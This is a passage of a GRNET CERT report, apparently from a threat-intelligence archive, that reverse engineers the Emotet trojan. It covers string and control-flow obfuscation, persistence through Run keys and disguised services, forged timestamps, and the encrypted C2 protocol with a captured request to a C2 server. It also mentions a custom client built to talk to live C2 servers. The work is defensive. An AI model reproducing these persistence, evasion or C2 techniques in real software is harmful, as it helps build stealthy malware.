functions.](https://github.com/grnet/emotet-utils/blob/master/decompiled/findModuleExportByHash.c)\n\nAgain, we wrote a short script, [generate_symbol_hashes2.py, that calculates the hashes for](https://github.com/grnet/emotet-utils/blob/master/utilities/generate_symbol_hashes2.py)\nevery symbol of some common libraries (e.g. `ntdll.dll,` `kernel32.dll, etc.) and`\nexports them to two C enumerations:\n\n\n-----\n\n-----\n\nFigure 26. Calculated library and symbol names hashes enumerations\nAfter importing the enumerations in Ghidra, we had a clear view of the modules and\nfunctions imported by these calls.\n\n\n-----\n\nFigure 27. Emotet trojan’s reverse engineered symbol resolving\n\n### String Obfuscation\n\nWe noticed that the binary did not contain any strings. This made us suspicious because it is\nimpossible for an executable that performs a meaningful functionality, not to contain any\nstrings. As a result, we assumed that some kind of string obfuscation is used. The following\nis the full list of the strings that we identified.\n\nFigure 28. List of defined strings in Emotet trojan\nThe first time we met the use of a string was in a call to `LoadLibraryW(), the only`\nparameter of which is the name of the library to be loaded. The value passed\nto `LoadLibraryW() is returned from function` `FUN_004035f0(), which in this case`\noperates on binary data at memory address `0x40d7f0 . It became apparent that this`\nfunction must be doing some kind of transformation (see decryption) to the data pointed to by\nits input.\n\nFigure\n\n29. Emotet trojan’s call of string decryption function\nWe reversed engineered the function and we confirmed our guess, its purpose is to decrypt\nthe input binary data to a Unicode string. The first 4 bytes of the binary data are the XOR\nkey, the next 4 bytes are the string’s encrypted length and the rest are encrypted string itself.\nAfter decrypting the length, the function iterates over all quadruples of encrypted characters\n(remember that the key is 4 bytes long) until all have been decrypted.\n\n\n-----\n\nFigure 30. Emotet trojan’s string decryption internals\n[For the sake of completeness, in decryptWideString.c we included the reverse engineered](https://github.com/grnet/emotet-utils/blob/master/decompiled/decryptWideString.c)\ncode of that function.\n\n\n-----\n\nTwo more versions of this function exist in the executable: one that decrypts the ciphertext to\nan ASCII string and one to a byte array. Luckily, all are compatible with each other as\nciphertexts are processed as 32-bit integers. Only their output types differ.\n\nWe implemented a tool to decrypt any string or byte array in the executable. The source\n[code can be found in decrypt_bytes.py.](https://github.com/grnet/emotet-utils/blob/master/utilities/decrypt_bytes.py)\n```\n$ ./decrypt_bytes.py nested-payload-2.exe 0xb9f0\nshlwapi.dll\n\n### Control Flow Obfuscation\n\n```\nWe continued our analysis with function `FUN_0406860(), the first function that the entry-`\npoint calls, and observed some kind of control flow obfuscation. Specifically, the function’s\nbody is split into multiple `if blocks, wrapped in a` `while loop. The flow is determined by a`\ncontrol variable that is set at the end of each block. Furthermore, as seen from the function\ngraph below, the majority of the blocks have the same predecessor and successor blocks.\nThis technique resembles the Control Flow Flattening technique, in which each function is\nsplit into basic blocks that are encapsulated in a `switch block wrapped in a` `while loop.`\n\n\n-----\n\nFigure 31. Emotet trojan’s Control Flow Obfuscation\nThis technique is also applied to the vast majority of the functions in the executable.\n\nWe were aware of techniques to automatically de-obfuscate control flow flattening (e.g. the\n[technique described in this quarkslab blog post), but since the size of the code was small](https://blog.quarkslab.com/deobfuscation-recovering-an-ollvm-protected-program.html)\nenough we decided to follow the flow manually.\n\n## Chapter 4. The trojan’s internals\n\n### Introduction\n\nIn the previous chapter we had a look at the trojan executable. We identified several\nobfuscation techniques incorporated in the executable and described the methods we used\nto overcome them. In this chapter, we will discuss the trojan’s inner functionalities.\n\n### Main flow overview\n\nWe followed a depth-first approach to reverse engineer the executable. We started from the\nfunction `FUN_0406860(), the one called by the executable’s entry-point, which we called`\n“main”.\n\n\n-----\n\nFigure 32.\n\nEmotet trojan’s entry-point\nThen, we followed the flow examining each function call. We did this until we reached a\nfunction that either made no further calls or only invoked already examined functions. After a\ncouple of weeks we had completely studied the executable’s code.\n\nAs a result, we were able to draw the code flow of the main function in a meaningful manner.\nBelow, we present the main control loop of the trojan:\n\nFigure 33. Emotet\n\n\n-----\n\ntrojan’s main function flow chart\nThe basic groups of states are highlighted:\n\nGrey states: Initialization of internal variables.\nPurple states: Persistence-related operations (running during the first run of the trojan\nor after communicating with the C2 network).\nGreen states: Initialization of parameters related to the communication with the C2\nnetwork.\nBlue states: Initialization of static data to be included in requests to the C2 network.\nOrange states: Re-initialization of variable data to be included in the next request to the\nC2 network.\nRed states: Communication with the chosen C2 server.\nYellow state: Handling of the C2 server’s response.\n\nInitially, the trojan loads the required libraries (states 1 and 2) and initializes its internal\nvariables (state 3).\n\nThen, it checks whether it will run with command line arguments or not (state 4). The\nexistence of command line arguments indicates that this is the first run of a self-update. The\ncommand line arguments contain the file path where the executable will have to migrate to.\nIn that case, states 8-13 perform a series of actions related to the persistence of the trojan.\n\n\n-----\n\nSpecifically, any existing file in the target file-path is renamed (state 8), the current\nexecutable is stored in the target file-path and its Zone Identifier ADS is removed (state 9).\nThe created file is marked as “old” by changing its timestamps (state 10). If the process runs\nwith administrative permissions, a new Service for the executable is created (state 11). Then,\nit waits until it receives a signal from its parent process (state 12). Finally, it runs itself from\nthe newly created executable (state 13).\n\nIn case that command line arguments are absent it’s either the first run after the Protector\nextracted the trojan or it’s any later run. This is inferred by checking the executable’s\ntimestamp (state 5). In case it’s indeed a first-run, any existing Services for the executable\nare removed provided that the executable has administrative permissions (state 6), and then\na random legitimate-looking file-path is picked as the target for the executable file (state 7).\nThen, states 8-13 run performing the series of actions described earlier.\n\nIn case it not a first-run (indicated by a “recent” timestamp) and the trojan runs with\nadministrative permissions, it checks whether its parent process name is “ services.exe ”\n(state 14). If so, it runs itself in a new process (state 13) and terminates the current process.\n\nFinally, if this is not the first run (indicated by an “old” timestamp), and the trojan runs without\nadministrative rights or its parent process name is not “ services.exe “, the C2\ncommunication flow happens. First, a new thread that monitors the changes of the current\nprocess’ executable filename is started (state 15). Then the control reaches state 16 and\nalways returns to it until the current process’ executable filename changes. That will be the\nresult of a self-update and after that, the trojan will wait for any threads to terminate (state\n39) and then will terminate its process.\n\nWhile no changes of the filename are detected, the trojan will repeatedly communicate with\nC2. First, the C2 communication parameters are initialized once (states 17-20). Furthermore,\nthe request data regarding the host system information are also initialized once (states 2126). On each communication attempt, the list of the processes currently running on the\nsystem as well as the list of active payload IDs will be included in the request (states 27-28).\nThen the actual communication with C2 is performed (states 29-31). Upon a successful\ncommunication the trojan will first check if a termination flag was received. In that case it will\nimmediately move its executable to the Temp folder and terminate itself (state 38).\nOtherwise, any existing files in the folder containing the trojan’s executable are deleted and a\nnew auto-run Registry Key is created (state 32). Then, the trojan will loop over the received\npayloads and execute them (state 33).\n\nOn the rest of the chapter we will focus on two main functionalities of the trojan, the\npersistence mechanisms and the communication with the Command-and-Control servers.\n\n### Persistence mechanisms\n\n\n-----\n\nTo identify its first run, the trojan should either run with command line arguments, or the\n```\nLastWriteTime of its executable file needs to be less than 8 days old. The timestamp is\n\n```\nretrieved by calling `GetFileInformationByHandleEx() on the handle returned by`\n```\nGetModuleFileNameW() .\n\n```\nUpon its first run, the trojan places its executable file in a sub-folder inside one of the\nfollowing Windows Special Folders:\n```\n   CSIDL_LOCAL_APPDATA (usually C:\\Users\\username\\AppData\\Local ) if the trojan\n\n```\nruns without administrator rights, or\n```\n   CSIDL_SYSTEMX86 (usually C:\\Windows\\SysWOW64 ) if the trojan runs with\n\n```\nadministrator rights.\n\nThe names given to sub-folder names and the filename of the malware, depend on whether\nthe executable did run with command line arguments or not:\n\nWith no command line parameters, the malware chooses two random files from the\nlegitimate executable (.exe) and library (.dll) files contained in the `CSIDL_SYSTEM`\n(usually `C:\\Windows\\System32 ) folder. The names of these randomly chosen files`\nare used to define the name of the sub-folder that the malware will be stored in, as well\nas the filename that the trojan will be stored with inside this sub-folder.\nWhen invoked with command line parameters, the sub-folder name and filename for\nthe malware are parsed from the base64-encoded command line argument. The\nstructure of the base64-decoded command line argument is described in detail in the\nResponses from C2 section.\n\nFurthermore, it deletes the corresponding `Zone.Identifier Alternate Data Stream`\n(which is added by the web client to mark files downloaded from external sites as possibly\nunsafe to run).\n\nFinally, all the timestamp attributes of the file ( CreationTime, LastAccessTime,\n\n`LastWriteTime` and ChangeTime ) are set to 8 days in the past. In this way, the next time\nthe malware runs, will be aware that it is not the first time.\n\nTo achieve persistence, two different methods are used:\n\n1. Registry Key: Upon receiving a C2 response, it creates a sub-key of\n\nthe `HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run`\nregistry key. The sub-key type is String ( REG_SZ, `0x1 ), its name is the filename of`\nthe trojan and the `Value is the full path inside the Windows Special Folder.`\n\n\n-----\n\n2. System Service: Upon its first run, if running with administrator rights it creates a new\n\nService. The Service type is `SERVICE_WIN32_OWN_PROCESS ( 0x10 ) and its binary`\npath is the full path inside the Windows Special Folder. Once the service is created it\npicks a random legitimate service from the list returned\nby `EnumServicesStatusExW() and copies its description on the malicious service,`\nusing `QueryServiceConfig2W() and` `ChangeServiceConfig2W() respectievely,`\nmaking it difficult to distinguish from legitimate services.\n\n### Command-and-Control\n\nAfter achieving persistence, the trojan tries to communicate with one of the Command and\nControl (C2) servers to inform it about the compromised system and retrieve the payloads to\nexecute. Emotet’s C2 network consists of multiple C2 servers with different C2 servers\nhaving different up-times, achieving redundancy and lowering the probability of detection. In\ntotal, we identified 126 unique C2 servers spread all over the world, mainly located in\nEurope, the Americas and south-east Asia:\n\nFigure 34. Emotet’s Command-and-Control server locations\nThe trojan binaries come with the list of IPv4 addresses and ports of all C2 servers\nembedded. The C2 servers are tried sequentially, until one responds successfully. On the\nfirst run, the trojan starts from the first C2 server of the list. On all subsequent runs, it\ncontinues from the last C2 server that responded successfully. We again wrote a short script\nto automatically extract the IPv4 addresses and ports from the binaries, which can be found\nin [extract_c2_socket_addresses.py. Finally, all C2 servers share a common private key](https://github.com/grnet/emotet-utils/blob/master/utilities/extract_c2_socket_addresses.py)\nwhich is used for protecting the communication between the trojan and the C2 server. The\npublic key is also embedded in the trojan binaries, albeit encrypted.\n\n\n-----\n\nData exchange between the trojan and the C2 server utilizes a complex serialization and\ndeserialization mechanism, which includes compression and encryption of both the request\nand response data. The actual communication takes place over plain HTTP, presumably to\nevade protections based on flagged TLS certificates. During the trojan’s initialization phase,\nthe C2’s RSA-768 public key is decrypted (using the decryption function described in the\nprevious chapter) and a random AES-128 session key is generated (using the Windows\nCrypto API). The public key is used to encrypt the session key and verify the response and\nthe session key to encrypt the request and decrypt the response. The encrypted session key\nis included in the request so that the C2 server can decrypt the request payload. Finally,\nSHA-1 is used for hashing.\n\nThe primitive data types used in the exchanged messages are the `byte, the` `char and`\nthe `uint (32-bit). The non-primitive data types are` `struct Bytes and` `struct String,`\nas shown in the following code snippet:\n```\nstruct Bytes {\n  byte *buffer;\n  uint size;\n};\nstruct String {\n  char *buffer;\n  uint length;\n};\n\n```\nAll primitive data types are serialized in little-endian byte order. A `struct Bytes`\nis serialized to the size of the buffer followed by the actual bytes of the buffer. A `struct`\n```\nString is serialized to the length of the string followed by the characters of the string,\n\n```\nexcluding the null terminator.\n\n**Request Payload**\n\nThe trojan uses information gathered from the compromised system to assemble the request\n_payload. This includes information that can be used to uniquely identify the system,_\ninformation about the operating system and the running processes as well as the current\nstate of the trojan itself. Upon analyzing the binary, we concluded that the structure of the\nrequest payload as used internally by the trojan is the following:\n```\nstruct RequestPayload {\n  struct String systemId;\n  uint systemInfo;\n  uint rdpSessionId;\n  uint date;\n  uint value_1000;\n  struct String otherProcessExecutableNames;\n  struct Bytes payloadIds;\n  uint currentProcessExecutablePathHash;\n};\n\n```\n\n-----\n\nThe request payload struct is serialized to the serialized request payload by serializing and\nconcatenating its fields in the order they appear, as shown in the image below.\n\nFigure 35. Emotet’s\n\nserialized request payload\n**systemId**\n\nThe ID assigned to the compromised system. It is constructed using the format string\n```\n%s_%08X, where the first specifier corresponds to the computer name and the second\n\n```\nspecifier to the volume serial number of the disk partition where Windows are installed. To\nget the computer name, `GetComputerNameA() is used. To get the volume serial number,`\n```\nGetWindowsDirectoryW() is used to get the drive letter of the partition where Windows\n\n```\nare installed and then `GetVolumeInformationW() is utilized to get the volume serial`\nnumber of that partition. Non-letter and non-digit characters in the computer name are\n\n\n-----\n\nreplaced by the character `X . For example, for the compromised system with computer`\nname `DESKTOP-K1C601 and volume serial number` `B4A6-FEC6 the value of` `systemId`\nwould be `DESKTOPXK1C601_B4A6FEC6 .`\n\n**systemInfo**\n\nA numeric value that encodes information regarding the OS and the architecture of the\ncompromised system. The trojan uses `RtlGetVersion() and` `GetNativeSystemInfo()`\nto get the `OSVERSIONINFOEXW and` `SYSTEM_INFO structures, respectively. The numeric value`\nis constructed as shown below:\n```\nOSVERSIONINFOEXW.wProductType * 100000 + OSVERSIONINFOEXW.dwMajorVersion * 1000 +\nOSVERSIONINFOEXW.dwMinorVersion * 100 + SYSTEM_INFO.wProcessorArchitecture\n\n```\nFor example, the `systemInfo value of` `110009 means that the operating system is`\nWindows 10 and the processor architecture is x64:\n```\n   wProductType : 1 ( VER_NT_WORKSTATION )\n   dwMajorVersion : 10\n   dwMinorVersion : 0\n   wProcessorArchitecture : 9 ( PROCESSOR_ARCHITECTURE_AMD64 )\n\n```\n**rdpSessionId**\n\nThe Remote Desktop Services session under which the current process is running. The\ntrojan uses `GetCurrentProcessId() to get the current process ID and`\n```\nProcessIdToSessionId() to convert the process ID to the RDP session ID.\n\n```\n**date**\n\nThe value `20200416 is hardcoded in the request payload, which can presumably be`\ndecoded to the date April 16, 2020. This could be the date that the current campaign started,\nhowever this cannot be confirmed.\n\n**value_1000**\n\nThe value `1000 is hardcoded in the request payload. Its purpose is unknown.`\n\n**otherProcessExecutableNames**\n\nA comma-separated list of the names of all processes running in the system, except for the\ncurrent and the parent processes. The trojan uses `CreateToolhelp32Snapshot() to take`\na snapshot of all processes in the system and `Process32FirstW() / Process32NextW()`\nto iterate over them. The current and the parent processes are filtered out. For example:\n```\nSearchFilterHost.exe,SearchProtocolHost.exe,Taskmgr.exe,conhost.exe,PowerShell.exe,not\n\n```\n\n-----\n\n**payloadIds**\n\nThe IDs of the payloads received from the C2 server that are currently running. To support\nthis functionality, the C2 server assigns an ID to every payload and the trojan maintains an\nin-memory list of the active payloads. Using this value, the C2 server is informed about the\npayloads that are currently running. The list of IDs is represented as an array of unsigned\nintegers. For example, if the payloads with IDs `2643,` `2647, and` `2759 are currently`\nrunning, the value of `payloadIds would be:`\n```\n53 0a 00 00 57 0a 00 00 c7 0a 00 00\n\n```\n**currentProcessExecutablePathHash**\n\nThe hash of the full path of the current process’ executable, lower-cased. The trojan uses\n```\nGetModuleFileNameW() to get the path and a custom hash function to hash the path, the\n\n```\n[reverse engineered version of which can be found in hashLowercase.c. For example, if the](https://github.com/grnet/emotet-utils/blob/master/decompiled/hashLowercase.c)\npath of the trojan’s executable was `C:\\Users\\IEUser\\AppData\\Local\\dxdiag\\reg.exe,`\nthe hash value would be `0x9f955b9 .`\n\n**Request**\n\nThe request encapsulates the request payload described before as well as the request flags.\nThe request flags are used to specify the type of the request payload.\n```\nstruct Request {\n  uint flags;\n  struct Bytes compressedPayload;\n};\n\n```\nBefore serializing the request struct, the serialized request payload is compressed using a\nLZ77-style algorithm, forming the compressed request payload. The request struct’s fields\nare serialized in the order they appear to form the serialized request, following again the\naforementioned serialization rules.\n\nFinally, the session key is encrypted with the C2 servers’ public key (96 bytes), the serialized\nrequest is hashed (20 bytes) and then encrypted with the session key to form the encrypted\n_request. The encrypted session key, the request hash and the encrypted request form the_\nrequest body. This is illustrated in the following image.\n\n\n-----\n\nFigure 36. Emotet’s\n\nencrypted request\n\n**HTTP request-response**\n\nThe trojan communicates with the C2 server over plain HTTP, using the WinINet API. In\npreparation of the communication, the trojan generates a random URL path, a random\nboundary for the multipart/form-data body and random field and file names for the form part\nto be submitted. Various headers (e.g. the Accept header) are hardcoded, while others (e.g.\nthe User-Agent header) are system-dependent. Following is a sample HTTP request sent by\nthe trojan to a C2 server:\n```\nGET /3QDtL0eyVn/macjAF9/ HTTP/1.1\nHost: 46.101.58.37:8080\nCache-Control: no-cache\nUpgrade-Insecure-Requests: 1\nReferer: 46.101.58.37/\nAccept-Encoding: gzip, deflate\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/7.0;\n.NET4.0C; .NET4.0E)\nDNT: 1\nConnection: keep-alive\nContent-Type: multipart/form-data; boundary=---------------gby5HOqeZpTWuWuQV0Pq0e\nContent-Length: 5090\n-----------------gby5HOqeZpTWuWuQV0Pq0e\nContent-Disposition: form-data; name=\"iopq\"; filename=\"yyexctg\"\nContent-Type: application/octet-stream\n<encrypted session key || serialized request hash || encrypted request>\n-----------------gby5HOqeZpTWuWuQV0Pq0e-\n```\nAnd the corresponding HTTP response:\n\n\n-----\n\n```\nHTTP/1.1 200 OK\nServer: nginx\nDate: Tue, 05 Jan 2021 18:09:55 GMT\nContent-Type: text/html; charset=UTF-8\nContent-Length: 87076\nConnection: keep-alive\nVary: Accept-Encoding\n<compressed response signature || compressed response hash || encrypted response>\n\n```\n**Response**\n\nJust like the request body, the response body consists of three parts, the compressed\nresponse’s signature, the compressed response’s hash and the encrypted response. The\nsignature is generated by the C2 servers’ private key and the compressed response is\nencrypted using the session key submitted to the C2 server as part of the request.\n\nFigure 37. Emotet’s\n\nencrypted response\nUpon decrypting the encrypted response, the trojan retrieves a `uint representing the`\ndecompressed response size followed by the compressed response, which can be\ndecompressed to the serialized response using the same LZ77-style algorithm that was used\nto compress the request. Finally, the serialized response can be deserialized to the following\nstruct, adhering again to the common serialization rules.\n```\nstruct Response {\n  struct Bytes serializedPayload;\n  uint flags;\n};\n\n```\nThe response flags are used to inform the trojan whether to continue or terminate its\noperation after executing the payload.\n\n**Response Payload**\n\nThe serialized response payload is a series of serialized `struct Bytes, each of which`\ncontains a serialized response payload struct.\n\n\n-----\n\n```\nstruct ResponsePayload {\n  uint payloadId;\n  uint payloadType;\n  struct Bytes payload;\n};\n\n```\nserialized response payload\n**payloadId**\n\n\nFigure 38. Emotet’s\n\n\nEvery payload has a unique ID. As discussed in the subsection about the request payload,\nthis is used to keep track of the payloads that are being executed by each compromised\nsystem. Payload IDs are incremental integers.\n\n**payloadType**\n\nEach received payload is handled based on the payloadType property. There are 4 payload\ntypes:\n\nType 1 ( 0x1 ): the payload is an executable (.exe) and it is written to a file which is\nexecuted in a new process, using `CreateProcessW() .`\nType 2 ( 0x2 ): the payload is an executable (.exe) and it is written to a file which is is\nexecuted in a new local user process, using `CreateProcessAsUserW() .`\nType 3 ( 0x3 ): the payload is a dynamic-link library (.dll), it is loaded into the address\nspace of the trojan’s process by a custom loader (similar to those discussed in previous\nchapters) and then its entrypoint is called in a new thread, using `CreateThread() .`\nType 4 ( 0x4 ): the payload is an executable (.exe) and it is written to a file which is\nexecuted in a new process, using `CreateProcessW(), with command line arguments.`\n\nFor types 1, 2 and 4, the file is stored the same directory where the executable of the trojan\nresides. Its filename is generated by concatenating the name without the extension of a\nrandom .exe or .dll file in the `CSIDL_SYSTEM ( C:\\Windows\\System32 ) directory, the`\npayload ID in a hexadecimal format ( %x ) and the “ `exe ” extension`\n\n\n-----\n\nFor type 3, the entry-point is called with a non-standard reason ( 10 ) and the reserved\nargument is a pointer to a struct with the system ID and the C2 servers’ public key in DER\nformat, as shown below.\n```\nstruct DllArgs {\n  char *systemId;\n  struct Bytes c2PublicKeyDer;\n};\n\n```\nFor type 4, the executable is called with a single command line argument, which is a base64encoded serialized struct with a handle to the calling process and the parent directory and\nname of the calling process’ executable, as shown below. This type is used for updating\nEmotet to newer versions.\n```\nstruct CmdLineArgs {\n  HANDLE *hProcess;\n  WCHAR *directoryAndFilenameWithoutExtension;\n  DWORD directoryAndFilenameWithoutExtensionLength;\n}\n\n```\n**payload**\n\nThe actual data of the payload.\n\n## Chapter 5. Monitoring the updates\n\n### Introduction\n\nIn the previous chapter we thoroughly described the internals of the trojan. Having a good\nunderstanding of the communication protocol between the trojan and the C2 network we\ncould now communicate with any C2 server, posing as an instance of the trojan. In this final\nchapter we show the custom client that we developed in order to communicate with the C2\nservers with arbitrary requests and describe the responses that we received. Furthermore,\nwe briefly describe how we used the Ghidra Scripting API in order to automate repeated\nprocesses of reverse-engineering which proved to be helpful for extracting useful information\nout of the received update payloads (e.g. new IP addresses of the C2 network).\n\n### Developing a custom “Emotet” client\n\nWe have already described the communication between the trojan instances and the C2\nnetwork, including the detection of the C2 servers, the structure of the requests and\nresponses as well as the compression and encryption algorithms. Based on this analysis we\ncould develop our own Emotet client, which allowed us to perform requests with arbitrary\nrequest payloads. Like the rest of the scripts, the client was implemented in Python. The\n[source code can be found in client.py. Using this client, we could monitor the uptime of each](https://github.com/grnet/emotet-utils/blob/master/utilities/client.py)\nof the listed C2 servers and parse the C2 responses.\n\n\n-----\n\nMost of the C2 responses were loadable DLL extensions to the trojan (type 3). The payloads\nreceived from different C2 servers at the same point in time were identical or almost\nidentical, differing only in the first 48 bytes of the read-only data section. Some of the\npayloads were obfuscated using variations of the techniques described in Chapter 3, while\nothers were not. The only update (type 4) that we received during our analysis was Europol’s\nclean-up client.\n\nFrom the collected statistics, only a fraction of the C2 servers were online at each time. The\nset of active C2 servers was changing over time, pressumably to avoid triggering alerts and\nbeing detected.\n\n### Automating repeated reverse-engineering processes\n\nOn each received payload we had to repeat the processes that we followed to overcome the\nincorporated obfuscation techniques. Since these techniques were slightly different for each\npayload (e.g. different XOR keys were used, algorithm constants were modified, variables\nwere stored in different memory addresses, etc.) we had to develop some pieces of code\nimplementing some basic logic. We used the Ghidra scripting API and developed Python\nscripts that automated repeated process that required considerable manual effort.\nSpecifically, the two main processes that were automated are the decryption of the strings\nand the resolution of the imported symbols. These basic automations made the analysis of\nthe received updates significantly easier. Implementation of the algorithms can also be found\nin [decrypt_bytes.py and](https://github.com/grnet/emotet-utils/blob/master/utilities/decrypt_bytes.py) [generate_symbol_hashes2.py.](https://github.com/grnet/emotet-utils/blob/master/utilities/generate_symbol_hashes2.py)\n\n## Epilogue\n\nIn this analysis we documented our defensive strategy against a large trojan-spreading\ncampaign. Our approach was based on static analysis and reverse engineering. We initially\navoided running any of the trojan’s stages. This was an intentional choice because with\ndynamic analysis certain conditions and corner cases could not have been triggered and\nwhole code paths could have been skipped. After many hours of reverse engineering and\nbuilding enough confidence that we had a full understanding of the trojan’s inner workings,\nwe used dynamic instrumentation to confirm our observations. For the latter we used the\nFrida dynamic instrumentation toolkit. Nevertheless, as shown by our work, the dynamic\nanalysis of a malware is not always required in order to undestand and analyze its\nfunctionality.\n\nNotice that in this analysis we only focused on analyzing the trojan itself and intentionally\nskipped the analysis of payloads spread by the C2 network. From the analysis of the trojan’s\ninternals in Chapter 4, it became apparent that Emotet enables the C2 servers to run\narbitrary payloads on infected computers. It is known that Emotet had been used in order to\nspread banking-related malware, e-mail harvesting malware, as well as ransomware.\nHowever, analyzing those payloads was considered out of the scope of planning a generic\ndefense against Emotet\n\n\n-----\n\nFinally, we did not include any analysis of the last payload that our update-monitoring\ninfrastructure received, which according to our observations and combined with public\nreports is Europol’s clean-up payload.\n\nWe hope that IT Security professionals will find our work useful for defending against similar\nmalware in the future.\n\n© 2022 GRNET CERT.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-02-08 - Reverse engineering Emotet – Our approach to protect GRNET against the trojan.pdf"
    ],
    "report_names": [
        "2021-02-08 - Reverse engineering Emotet – Our approach to protect GRNET against the trojan.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535937,
    "ts_updated_at": 1743041125,
    "ts_creation_date": 1653710576,
    "ts_modification_date": 1653710576,
    "files": {
        "pdf": "https://archive.orkl.eu/01e138b328ed775b3c196fa322747ed0d7677727.pdf",
        "text": "https://archive.orkl.eu/01e138b328ed775b3c196fa322747ed0d7677727.txt",
        "img": "https://archive.orkl.eu/01e138b328ed775b3c196fa322747ed0d7677727.jpg"
    }
}